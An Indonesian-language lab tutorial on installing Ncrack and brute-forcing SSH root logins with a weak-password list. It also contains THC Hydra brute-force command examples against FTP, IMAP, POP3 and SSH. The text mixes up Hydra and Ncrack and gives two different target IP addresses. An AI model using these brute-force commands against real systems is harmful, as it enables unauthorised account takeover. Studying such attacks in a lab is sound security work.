INSTALASI NCRACK
----------------
- **Step 1**    : Download source code Ncrack
```
wget https://nmap.org/ncrack/dist/ncrack-0.5.tar.gz
```
- **Step 2**    : Untuk menkonfigurasi, compile dan menginstall Hydra, ketik kode berikut di terminal:
```
tar -xzf ncrack-0.5.tar.gz
cd ncrack-0.5
./configure
make
su root
make install
```

SUPPORTED PLATFORMS
-------------------
- Semua platform UNIX (Linux, *bsd, Solaris, etc.)
- MacOS
- Windows dengan Cygwin (IPv4 and IPv6)
- Mobile systems based on Linux, MacOS or QNX (e.g. Android, iPhone, Blackberry 10, Zaurus, iPad)

CARA PENGGUNAAN
---------------
**Contoh**:
```
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```
Pertama, Siapkan file yang terdiri dari kumpulan password yang dipisahkan oleh baris atau download [disini](/assets/ncrack-hydra/500-worst-passwords.txt). Pada uji coba kali ini, kita akan mencoba melakukan _brute force attack_ pada protokol SSH ke ip address `10.151.36.98` dengan asumsi username `root` dan list password menggunakan file yang telah disiapkan, jalankan perintah dibawah ini pada terminal :
```
ncrack -p 22 --user root -P 500-worst-passwords.txt 10.151.254.180
```
![](/assets/ncrack-hydra/ncrack-berhasil.png)
KESIMPULAN
----------
Dengan uji coba yang telah dilakukan, Ncrack dapat berhasil menyerang protokol ssh dengan _brute force attack_ jika password dari target terdapat didalam file password yang dibuat oleh penyerang dengan waktu 90 detik, berarti proses serangan dengan Ncrack lebih cepat dari THC Hydra. Jika password tidak terdapat dalam file, maka serangan akan gagal.







